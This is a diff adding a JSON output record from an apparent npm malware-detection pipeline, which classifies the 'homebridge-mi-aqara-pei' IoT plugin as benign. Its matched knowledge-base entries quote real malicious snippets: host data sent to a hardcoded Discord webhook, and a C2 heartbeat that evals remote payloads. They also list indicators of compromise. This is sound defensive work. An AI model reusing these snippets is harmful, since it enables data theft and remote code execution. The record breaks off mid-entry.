@@ -1,0 +1,1586 @@
+{
+  "package_name": "homebridge-mi-aqara-pei",
+  "package_version": "0.8.1",
+  "label": "benign",
+  "detection_time": "2026-05-26T18:50:23.536357",
+  "status": "success",
+  "selected_files_count": 12,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js",
+    "package/lib/AccessoryUtil.js",
+    "package/lib/ConfigUtil.js",
+    "package/lib/DeviceUtil.js",
+    "package/lib/GatewayUtil.js",
+    "package/lib/LogUtil.js",
+    "package/lib/ParseUtil.js",
+    "package/manage/easyui/jquery.easyui.min.js",
+    "package/manage/easyui/jquery.min.js",
+    "package/parser/AccessoryParser.js",
+    "package/parser/AcpartnerParser.js"
+  ],
+  "is_malicious": false,
+  "total_files": 12,
+  "malicious_files": 0,
+  "total_slices": 3,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/homebridge-mi-aqara-pei/0.8.1/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/homebridge-mi-aqara-pei/0.8.1/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 3,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "const dgram = require('dgram');\n\nconst serverAqaraLANProtocolSocket = dgram.createSocket({\n    type: 'udp4',\n    reuseAddr: true\n});\nconst serverAqaraLANProtocolMulticastAddress = '224.0.0.50';\nconst serverAqaraLANProtocolMulticastPort = 4321;\nconst serverAqaraLANProtocolServerPort = 9898;\n\nMiAqaraPlatform.prototype.initServerAqaraLANProtocol = function() {\n    var that = this;\n    \n    // err - Error object, https://nodejs.org/api/errors.html\n    serverAqaraLANProtocolSocket.on('error', (err) => {\n        that.log.error('error, msg - %s, stack - %s\\n', err.message, err.stack);\n    });\n    \n    serverAqaraLANProtocolSocket.on('listening', () => {\n        if (null == that.ConfigUtil.getBindAddress()) {\n            serverAqaraLANProtocolSocket.addMembership(serverAqaraLANProtocolMulticastAddress);\n        } else {\n            serverAqaraLANProtocolSocket.setMulticastInterface(that.ConfigUtil.getBindAddress());\n            serverAqaraLANProtocolSocket.addMembership(serverAqaraLANProtocolMulticastAddress, that.ConfigUtil.getBindAddress());\n        }\n        that.log.info(\"Aqara LAN protocol server is listening on port: \" + serverAqaraLANProtocolServerPort);\n    });\n    serverAqaraLANProtocolSocket.on('message', this.parseMessage.bind(this));\n\n    serverAqaraLANProtocolSocket.bind(serverAqaraLANProtocolServerPort);\n}\n\nMiAqaraPlatform.prototype.sendWhoisCommand = function() {\n    var that = this;\n    var hosts = that.ConfigUtil.getHosts();\n    var gateways = that.ConfigUtil.getGateways();\n    if(Object.getOwnPropertyNames(hosts).length > 0) {\n        for (var key in hosts) {\n            var vMsg = '{\"cmd\":\"virtual_iam\",\"sid\":\"' + key + '\",\"port\":\"' + hosts[key]['port'] + '\",\"ip\":\"' + hosts[key]['ip'] + '\"}';\n            that.parseMessage(vMsg, null);\n        }\n    }\n    if(Object.getOwnPropertyNames(hosts).length < Object.getOwnPropertyNames(gateways).length) {\n        var whoisCommand = '{\"cmd\": \"whois\"}';\n        that.log.debug(\"[Send]\" + whoisCommand);\n        serverAqaraLANProtocolSocket.send(whoisCommand, 0, whoisCommand.length, serverAqaraLANProtocolMulticastPort, serverAqaraLANProtocolMulticastAddress);\n    }\n}\n\nMiAqaraPlatform.prototype.parseMessage = function(msg, rinfo) {\n    var that = this;\n\n    var jsonObj;\n    try {\n        jsonObj = that.getJsonObj(msg);\n    } catch (ex) {\n        that.log.error(\"Bad msg: \" + msg);\n        return;\n    }\n\n    var cmd = jsonObj['cmd'];\n    if (cmd === 'iam' || cmd === 'virtual_iam') {\n        that.log.debug(\"[Revc]\" + msg);\n        var gatewaySid = jsonObj['sid'];\n        if(that.ConfigUtil.isConfigGateway(gatewaySid)) {\n            if(that.ConfigUtil.isHostGateway(gatewaySid) && cmd != 'virtual_iam') {\n                return;\n            }\n\n            var gateway = that.GatewayUtil.getBySid(gatewaySid);\n            if(!gateway) {\n                gateway = {\n                    sid: gatewaySid,\n                    passwd: that.ConfigUtil.getGatewayPasswordByGatewaySid(gatewaySid),\n                    ip: jsonObj['ip'],\n                    port: jsonObj['port']\n                }\n                gateway = that.GatewayUtil.addOrUpdate(gatewaySid, gateway);\n\n                if(!that.DeviceUtil.getBySid(gatewaySid)) {\n                    var gatewayDevice = {\n                        sid: gatewaySid,\n                        gatewaySid: gatewaySid,\n                        lastUpdateTime: Date.now()\n                    }\n                    that.DeviceUtil.addOrUpdate(gatewaySid, gatewayDevice);\n\n                    var command1 = '{\"cmd\":\"read\", \"sid\":\"' + gatewaySid + '\"}';\n                    that.sendReadCommand(gatewaySid, command1, {timeout: 0.5 * 60 * 1000, retryCount: 12}).then(result => {\n                        that.DeviceUtil.addOrUpdate(result['sid'], {model: result['model']});\n                        var createAccessories = that.ParseUtil.getCreateAccessories(result);\n                        that.registerPlatformAccessories(createAccessories);\n                        that.ParseUtil.parserAccessories(result);\n\n                        that.deleteDisableAccessories(result['sid'], result['model']);\n\n                        var proto_version = null;\n                        try {\n                            if('read_ack' === result['cmd']) {\n                                var data = result['data'];\n                                proto_version = data && JSON.parse(data)['proto_version'];\n                            } else if('read_rsp' === result['cmd']) {\n                                var params = result['params'];\n                                if(params) {\n                                    for(var i in params) {\n                                        if(params[i]['proto_version']) {\n                                            proto_version = params[i]['proto_version'];\n                                            break;\n                                        }\n                                    }\n                                }\n                            }\n                            gateway = that.GatewayUtil.addOrUpdate(gatewaySid, {\n                                proto_version: proto_version,\n                                model: result['model']\n                            });\n\n                            var listCmd = that.getCmdListByProtoVersion(proto_version);\n                            if(listCmd) {\n                                that.log.debug(\"[Send]\" + listCmd);\n                                serverAqaraLANProtocolSocket.send(listCmd, 0, listCmd.length, jsonObj['port'], jsonObj['ip']);\n                            }\n                        } catch(e) {\n                            that.log.debug(e);\n                        }\n                    }).catch(function(err) {\n                        that.DeviceUtil.remove(gatewaySid);\n                        that.log.error(err);\n                    });\n                } \n            } else {\n                var proto_version = gateway['proto_version'];\n                var listCmd = that.getCmdListByProtoVersion(proto_version);\n                if(listCmd) {\n                    that.log.debug(\"[Send]\" + listCmd);\n                    serverAqaraLANProtocolSocket.send(listCmd, 0, listCmd.length, jsonObj['port'], jsonObj['ip']);\n                }\n            }\n        }\n    } else if (cmd === 'get_id_list_ack' || cmd === 'discovery_rsp') {\n        that.log.debug(\"[Revc]\" + msg);\n        var gatewaySid = jsonObj['sid'];\n\n        var gateway = that.GatewayUtil.getBySid(gatewaySid);\n        if(gateway) {\n            that.GatewayUtil.addOrUpdate(gatewaySid, {token: jsonObj['token']});\n\n            var deviceSids = that.getDeviceListByJsonObj(jsonObj, gateway.proto_version);\n            var index = 0;\n            var sendInterval = setInterval(() => {\n                if(index >= deviceSids.length) {\n                    that.log.debug(\"read gateway(\" + gatewaySid + \") device list finished. size: \" + index);\n                    clearInterval(sendInterval);\n                    return;\n                }\n\n                var deviceSid = deviceSids[index];\n                if(!that.DeviceUtil.getBySid(deviceSid)) {\n                    var device = {\n                        sid: deviceSid,\n                        gatewaySid: gatewaySid,\n                        model: jsonObj['model'],\n                        lastUpdateTime: Date.now()\n                    }\n                    that.DeviceUtil.addOrUpdate(deviceSid, device);\n                }\n\n                var command2 = '{\"cmd\":\"read\", \"sid\":\"' + deviceSid + '\"}';\n                that.sendReadCommand(deviceSid, command2, {timeout: 3 * 1000, retryCount: 12}).then(result => {\n                    that.DeviceUtil.addOrUpdate(result['sid'], {model: result['model']});\n                    var createAccessories = that.ParseUtil.getCreateAccessories(result);\n                    that.registerPlatformAccessories(createAccessories);\n                    that.ParseUtil.parserAccessories(result);\n\n                    that.deleteDisableAccessories(result['sid'], result['model']);\n                }).catch(function(err) {\n                    that.DeviceUtil.remove(deviceSid);\n                    that.log.error(err);\n                });\n\n                index++;\n            }, 50);\n        }\n    }\n    // Other cmd handlers omitted for brevity\n}\n\nMiAqaraPlatform.prototype.sendCommand = function(ip, port, msgTag, msg, options) {\n    var that = this;\n    return new Promise((resolve, reject) => {\n        if(!that.PromisesSendCommand) {\n            that.PromisesSendCommand = {};\n        }\n        \n        const triggerCorrelationPromises = (fun, res) => {\n            var promisesSendCommands = that.PromisesSendCommand[ip + port + msg];\n            if(promisesSendCommands) {\n                promisesSendCommands = promisesSendCommands.concat();\n                delete that.PromisesSendCommand[ip + port + msg];\n                promisesSendCommands.forEach(function(promisesSendCommand, index, arr) {\n                    const p = that._promises[promisesSendCommand];\n                    if(p) {\n                        p[fun](res);\n                    }\n                });\n            }\n        }\n        \n        let retryLeft = (options && options.retryCount) || 3;\n        const send = () => {\n            retryLeft --;\n            that.log.debug(\"[Send]\" + msg);\n            serverAqaraLANProtocolSocket.send(msg, 0, msg.length, port, ip, err => err && reject(err));\n        }\n        const _sendTimeout = setInterval(() => {\n            if(retryLeft > 0) {\n                send();\n            } else {\n                clearInterval(_sendTimeout);\n                delete that._promises[msgTag];\n                var err = new Error('timeout: ' + msg);\n                triggerCorrelationPromises('reject', err);\n                reject(err);\n            }\n        }, (options && options.timeout) || 1 * 1000);\n            \n        that._promises[msgTag] = {\n            resolve: res => {\n                clearInterval(_sendTimeout);\n                delete that._promises[msgTag];\n                triggerCorrelationPromises('resolve', res);\n                resolve(res);\n            },\n            reject: err => {\n                clearInterval(_sendTimeout);\n                delete that._promises[msgTag];\n                triggerCorrelationPromises('reject', err);\n                reject(err);\n            }\n        };\n        \n        if(that.PromisesSendCommand[ip + port + msg]) {\n            that.PromisesSendCommand[ip + port + msg].push(msgTag);\n        } else {\n            that.PromisesSendCommand[ip + port + msg] = [];\n            send();\n        }\n    })\n}\n\nMiAqaraPlatform.prototype.sendReadCommand = function(deviceSid, command, options) {\n    var that = this;\n    return new Promise((resolve, reject) => {\n        var device = that.DeviceUtil.getBySid(deviceSid);\n        var gateway = that.GatewayUtil.getBySid(device.gatewaySid);\n        var msgTag = 'read_' + deviceSid + \"_t\" + that.getPromisesTagSerialNumber();\n        that.sendCommand(gateway.ip, gateway.port, msgTag, command, options).then(result => {\n            resolve(result);\n        }).catch(function(err) {\n            reject(err);\n        });\n    })\n}\n\nMiAqaraPlatform.prototype.sendWriteCommandWithoutFeedback = function(deviceSid, command, options) {\n    var that = this;\n    var device = that.DeviceUtil.getBySid(deviceSid);\n    var gateway = that.GatewayUtil.getBySid(device.gatewaySid);\n    \n    var cipher = crypto.createCipheriv('aes-128-cbc', that.ConfigUtil.getGatewayPasswordByGatewaySid(gateway['sid']), iv);\n    var gatewayToken = gateway['token'];\n    var key = cipher.update(gatewayToken, \"ascii\", \"hex\");\n    cipher.final('hex');\n    \n    command = command.replace('${key}', key);\n    that.log.debug(\"[Send]\" + command);\n    serverAqaraLANProtocolSocket.send(command, 0, command.length, gateway.port, gateway.ip, err => err && reject(err));\n}",
+          "is_malicious": false,
+          "malice_score": 0.5178890744845073,
+          "confidence": 0.1,
+          "behavior_summary": "At initialization and periodically, the code accesses configured hosts and gateways, constructs JSON commands including 'whois' and 'virtual_iam' with hardcoded multicast address 224.0.0.50:4321, and sends these UDP packets via dgram socket. Upon receiving UDP messages, it parses JSON commands, updates internal gateway and device state, and sends further UDP commands to device IPs and ports. This facilitates device discovery and management over the network, enabling remote control and data collection from IoT devices on the local network.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code implements a UDP-based local network protocol for discovering and managing IoT devices (specifically Aqara devices) on a local network. It uses multicast UDP to send 'whois' and 'virtual_iam' commands to discover devices and gateways, parses incoming JSON messages, updates internal device and gateway state, and sends further commands to devices. This behavior aligns with legitimate IoT device management and discovery protocols. There is no evidence of remote command execution for attacks, no data exfiltration to external servers, no encrypted payload execution, and no suspicious obfuscation or unauthorized system manipulation. The code uses standard Node.js dgram APIs for UDP communication and JSON parsing for protocol messages. The multicast address and ports are hardcoded but correspond to local network discovery, not external C2 communication. Compared to the known malicious patterns, this code lacks any DDoS attack logic, external HTTPS data exfiltration, or remote code execution. Therefore, it is best classified as benign IoT device management code.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20240708_171944_172509_snippet_5",
+              "source_package": " ()",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240708_171944_172509/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5247347354888916,
+              "code_similarity": 0.4589073061943054,
+              "behavior_similarity": 0.5905622243881226,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "// Example (pseudocode):\nif (receivedCommand == \"DDoS\") {\n    launchDDoS(targetIP, method);\n}",
+                "code_behavior": "At runtime, the code receives distributed denial-of-service (DDoS) commands from a command-and-control server and launches DDoS attacks against specified targets using the IoT device's network resources.",
+                "malice_analysis": {
+                  "why_suspicious": "IoT devices should not accept remote attack commands or participate in DDoS attacks, which are illegal and disruptive.",
+                  "violated_expectations": "Legitimate IoT firmware does not include logic for remote command execution or DDoS attack routines.",
+                  "similar_legitimate_use": "No legitimate use case exists for DDoS logic in consumer IoT devices.",
+                  "key_indicators": [
+                    "Remote command execution logic",
+                    "DDoS attack routines embedded in firmware",
+                    "C2 communication for attack coordination"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "Simps botnet binary (IoT device)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "",
+                  "package_manager": "",
+                  "package_versions": "",
+                  "why_malicious": ""
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker identifies misconfigured cloud database in Android app and accesses sensitive data.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data exfiltration and privacy breach"
+                  },
+                  {
+                    "step": 2,
+                    "action": "User receives phishing email with malicious attachment or link (STRRAT, Bizarro, BazarLoader).",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Malware execution on victim device"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malware executes, exfiltrates data, encrypts files, or launches DDoS attacks (STRRAT, Simps, Qlocker).",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Data loss, credential theft, service disruption"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Ransomware or backdoor maintains persistence and communicates with C2.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_4",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Ongoing attacker control or ransom demand"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unprotected cloud database access from mobile applications without authentication or access control",
+                    "File encryption and data exfiltration routines in Java applications",
+                    "Forced session termination and credential capture in banking applications",
+                    "Unauthorized command execution in backup/NAS applications",
+                    "IoT device participation in DDoS attacks via remote command execution",
+                    "Malware delivery through vishing and social engineering techniques"
+                  ],
+                  "file_indicators": [
+                    "Hardcoded database URLs or references in mobile application code",
+                    "Java classes or binaries containing ransomware or RAT logic (e.g., STRRAT)",
+                    "Scripts or binaries named BazarLoader, Qlocker, Simps",
+                    "Unusual executable downloads or script executions following support or vishing calls"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to known C2 domains or IPs associated with STRRAT, Bizarro, Simps, or BazarLoader",
+                    "Unusual outbound traffic from NAS or IoT devices to external servers",
+                    "Data exfiltration to cloud storage or attacker-controlled infrastructure"
+                  ],
+                  "how_to_detect": "Monitor for unprotected cloud database endpoints in mobile applications, detect file encryption and exfiltration routines in Java processes, flag forced session manipulation and credential capture in banking apps, alert on unauthorized command execution in NAS/backup apps, watch for IoT devices generating DDoS traffic, and correlate malware downloads or script executions with vishing or social engineering events."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202035_587243_snippet_2",
+              "source_package": "zngularjs (and 124+ typosquat variants) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202035_587243/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5196514129638672,
+              "code_similarity": 0.4703066945075989,
+              "behavior_similarity": 0.5689961910247803,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "function sendToDiscord(e, t) {\n    const o = new URL(e),\n        n = JSON.stringify({ content: t }),\n        s = {\n            hostname: o.hostname,\n            port: 443,\n            path: o.pathname + o.search,\n            method: \"POST\",\n            headers: {\n                \"Content-Type\": \"application/json\",\n                \"Content-Length\": n.length\n            }\n        },\n        r = https.request(s, e => {});\n    r.on(\"error\", e => {\n        console.error(e)\n    }), r.write(n), r.end()\n}\nconst https = require(\"https\"),\n    os = require(\"os\"),\n    main = ! function() {\n        var e = \"https://discord.com/api/webhooks/1155988140591419412/bleuGvUtBCzaGsAkAI1MT9Yd-6YxHuUlZe91XSdfioky5-0e3gzeW4ztWskX1qYjSxzr\";\n        const t = Object.keys(os.networkInterfaces()).map(e => os.networkInterfaces()[e][0].address).join(\",\").concat(\", \" + os.hostname());\n        return sendToDiscord(e, t), {}\n    }();\nmodule.exports = main;",
+                "code_behavior": "At preinstall time, the code collects all network interface addresses and the system hostname using os.networkInterfaces() and os.hostname(), then sends this information via HTTPS POST to a hardcoded Discord webhook, resulting in unauthorized exfiltration of host data.",
+                "malice_analysis": {
+                  "why_suspicious": "The script gathers sensitive host information (network interfaces and hostname) and transmits it to an external Discord webhook without user knowledge or consent, which is a clear data exfiltration technique.",
+                  "violated_expectations": "Normal npm install scripts do not collect or transmit host or network information. Exfiltrating such data to a third-party service, especially a Discord webhook, is a severe violation of privacy and security norms.",
+                  "similar_legitimate_use": "Legitimate telemetry or error reporting may collect environment info, but only with user consent and never to a Discord webhook or similar non-standard endpoint.",
+                  "key_indicators": [
+                    "Use of os.networkInterfaces() and os.hostname() to collect host data",
+                    "Hardcoded Discord webhook URL as exfiltration endpoint",
+                    "HTTPS POST request containing system information during install",
+                    "No user notification or consent for data collection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall (via node new.js)",
+                  "file_location": "new.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "os"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "zngularjs (and 124+ typosquat variants)",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.2",
+                  "why_malicious": "The package and its numerous typosquat variants are crafted to impersonate popular libraries (such as react and angular) and execute a preinstall script that exfiltrates host network and system information to a hardcoded Discord webhook. This constitutes a supply chain attack involving unauthorized data exfiltration and abuse of user trust."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs a typosquat package (e.g., zngularjs) believing it to be a legitimate library.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of preinstall script"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The preinstall script defined in package.json triggers execution of new.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of malicious code in new.js"
+                  },
+                  {
+                    "step": 3,
+                    "action": "new.js collects network interface addresses and hostname, then sends this data to a Discord webhook via HTTPS POST.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Exfiltration of host data to attacker"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of preinstall scripts that invoke external JavaScript files during npm install",
+                    "Collection of network interface and hostname information using os.networkInterfaces() and os.hostname() in install scripts",
+                    "Outbound HTTPS POST requests to Discord webhooks or other non-standard endpoints during package installation"
+                  ],
+                  "file_indicators": [
+                    "package.json with scripts.preinstall referencing 'node new.js' or similar external script",
+                    "Presence of new.js or similarly named files in the package root directory"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS requests to discord.com/api/webhooks/*",
+                    "Unusual network activity to Discord or other non-standard endpoints during npm install"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall scripts that execute external files. Flag packages that access os.networkInterfaces() or os.hostname() in install scripts. Detect outbound HTTPS POST requests to Discord webhooks or other suspicious endpoints during package installation. Use sandboxing or network monitoring to block or alert on network access during install scripts."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202035_950938_snippet_4",
+              "source_package": "pingan-vue-floating (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202035_950938/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5126485228538513,
+              "code_similarity": 0.4710618257522583,
+              "behavior_similarity": 0.5542352199554443,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "function heartbeat(){\n    const requestData = {\n        hostname: os.hostname(),\n        uuid:machineIdSync({original: true}),\n        os:os.platform(),\n    };\n    sendRequest(url+'/api/index',aesEncrypt(JSON.stringify(requestData)))\n    const task = {\n        uuid:machineIdSync({original: true}),\n    }\n    sendRequest(url+'/api/captcha',aesEncrypt(JSON.stringify(task))).then(result => {\n        try{\n            if (result !== undefined) {\n                const data = JSON.parse(result);\n                const decodedData = Buffer.from(data.code, 'base64').toString();\n                eval(decodedData)\n            }\n        }catch (error){\n        }\n    });\n}",
+                "code_behavior": "Every 45 seconds at runtime, the code collects host and machine identifiers, encrypts them, and sends them to the C2 server; it then receives an encrypted payload, decodes and executes it using eval, enabling remote code execution by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "Periodic exfiltration of host info and execution of remote, attacker-supplied code is highly malicious and enables full compromise of the victim system.",
+                  "violated_expectations": "Legitimate packages do not beacon to remote servers or execute arbitrary code received from the network.",
+                  "similar_legitimate_use": "Heartbeat mechanisms are used in legitimate monitoring agents, but never to execute arbitrary code from untrusted sources.",
+                  "key_indicators": [
+                    "periodic network beaconing to C2 server",
+                    "encrypted payload delivery and execution via eval",
+                    "exfiltration of host and machine identifiers"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (daemonized by pm2)",
+                  "file_location": "app.js (heartbeat function)",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "pingan-vue-floating",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.7",
+                  "why_malicious": "The package is malicious because it establishes a persistent, encrypted two-way communication channel with a remote command-and-control (C2) server upon installation, exfiltrates host and machine identifiers, and executes attacker-supplied, encrypted JavaScript payloads on the victim's machine. The package employs obfuscation, background daemonization, and anti-analysis techniques to evade detection and enable remote code execution, posing a severe risk to any system where it is installed."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Upon installation, the postinstall script executes index.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Daemonization of malicious process"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js uses pm2 to launch app.js as a persistent background daemon.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of malicious logic in app.js"
+                  },
+                  {
+                    "step": 3,
+                    "action": "app.js checks for a marker file and, if absent, creates it and starts the heartbeat loop.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Initiation of periodic C2 communication"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Every 45 seconds, heartbeat collects host info and sends it (encrypted) to the C2 server.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_6"
+                    ],
+                    "leads_to": "C2 server can respond with encrypted payloads"
+                  },
+                  {
+                    "step": 5,
+                    "action": "If a payload is received, it is decrypted, base64-decoded, and executed via eval, enabling remote code execution.",
+                    "implemented_by": [
+                      "snippet_4",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Attacker achieves arbitrary code execution on victim machine"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "postinstall script executing custom Node.js code during package installation",
+                    "pm2 used to daemonize scripts at install time, creating persistent background processes",
+                    "periodic (every 45 seconds) outbound HTTPS POST requests to hardcoded or obfuscated C2 domains",
+                    "AES-encrypted payloads in network traffic between host and C2 server",
+                    "eval execution of decrypted, network-supplied JavaScript code"
+                  ],
+                  "file_indicators": [
+                    "Presence of node_logs.txt in system temp directory",
+                    "Obfuscated or unusually large app.js file with benign exports and hidden malicious logic at the end",
+                    "index.js that only launches pm2 with app.js as the target script"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to ql.rustdesk.net or 62.234.32.226",
+                    "Encrypted payloads in POST body to /api/index and /api/captcha endpoints",
+                    "User-Agent string: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134"
+                  ],
+                  "how_to_detect": "Monitor for npm packages with postinstall scripts that launch pm2 or background daemons. Flag packages that create marker files in temp directories (e.g., node_logs.txt) and those that make periodic outbound HTTPS POST requests to suspicious or obfuscated domains, especially with encrypted payloads. Detect use of eval on decrypted network data. Analyze app.js files for obfuscated code and hidden logic at the end of otherwise benign files. Correlate network indicators such as connections to ql.rustdesk.net or 62.234.32.226 with the presence of AES-encrypted payloads and suspicious User-Agent strings."
+                }
+              }
+            },
+            {
+              "match_id": "20240708_171914_284597_snippet_4",
+              "source_package": "Zoho ManageEngine ADSelfService Plus (N/A (proprietary enterprise software))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240708_171914_284597/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5115574598312378,
+              "code_similarity": 0.40838927030563354,
+              "behavior_similarity": 0.6147255897521973,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "Go-based botnet code exploiting multiple IoT vulnerabilities, propagating via network protocols, and establishing WebSocket C2 communication.",
+                "code_behavior": "At runtime, the botnet code exploits known vulnerabilities in IoT devices, self-propagates to other devices over the network, and establishes persistent outbound WebSocket connections to a command-and-control server for remote control and further instructions.",
+                "malice_analysis": {
+                  "why_suspicious": "Self-propagating botnets that exploit multiple vulnerabilities and establish C2 channels are highly malicious and are used for large-scale attacks.",
+                  "violated_expectations": "IoT devices should not download or execute arbitrary code, nor connect to unknown C2 servers or propagate malware to other devices.",
+                  "similar_legitimate_use": "Automated update mechanisms may contact remote servers, but only with proper authentication and integrity checks, and never establish persistent C2 channels.",
+                  "key_indicators": [
+                    "Unusual outbound WebSocket connections to unknown IPs or domains",
+                    "Exploitation of multiple device protocols for lateral movement",
+                    "Rapid scanning and infection of other networked devices",
+                    "Presence of Go binaries with network propagation logic"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (Zerobot infection)",
+                  "file_location": "IoT device firmware or process memory",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "process execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Zoho ManageEngine ADSelfService Plus",
+                  "package_manager": "N/A (proprietary enterprise software)",
+                  "package_versions": "vulnerable versions prior to 6114 (CVE-2021-40539), Microsoft Office documents (CVE-2022-41128), IoT device firmware (various), N/A for phishing kit and Drokbk malware",
+                  "why_malicious": "The attack campaign leverages multiple malicious components: weaponized Microsoft Office documents exploiting CVE-2022-41128 for code execution, credential-harvesting phishing kits, exploitation of Zoho ManageEngine ADSelfService Plus (CVE-2021-40539) for unauthenticated remote code execution, IoT botnet propagation (Zerobot), and malware (Drokbk) using public repositories for command-and-control. These elements enable initial compromise, credential theft, lateral movement, persistence, and remote control, representing a coordinated, multi-stage threat."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim receives phishing email or malicious document.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "User opens document or clicks link."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes: exploit triggers or credentials are harvested.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "System compromise or credential exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker leverages vulnerabilities (e.g., Zoho ManageEngine, IoT devices) for further access or lateral movement.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Persistence, data exfiltration, or botnet propagation."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malware establishes C2 communication (e.g., via GitHub dead drop or WebSocket).",
+                    "implemented_by": [
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Remote control, data theft, or further attacks."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Document open triggers code execution exploiting browser or scripting engine vulnerabilities (e.g., CVE-2022-41128)",
+                    "Phishing pages mimicking legitimate login portals and exfiltrating credentials via HTTP POST to non-corporate domains",
+                    "Unauthenticated access to sensitive web application endpoints (e.g., Zoho ManageEngine ADSelfService Plus CVE-2021-40539)",
+                    "IoT devices making unexpected outbound WebSocket connections to unknown servers",
+                    "Malware querying public code repositories (e.g., GitHub) for encoded C2 instructions and decoding them for dynamic C2 communication"
+                  ],
+                  "file_indicators": [
+                    "Office documents (e.g., .docx) with embedded scripting exploits targeting Internet Explorer",
+                    "HTML files mimicking Microsoft login pages with credential POST actions to non-legitimate domains",
+                    "Unusual access logs to Zoho ManageEngine ADSelfService Plus endpoints from unauthenticated sources",
+                    "Go binaries present on IoT devices exhibiting network propagation behavior",
+                    "Scripts or binaries (Python/PowerShell) that access GitHub repositories and decode content for C2 addresses"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to attacker-controlled domains used for phishing or C2",
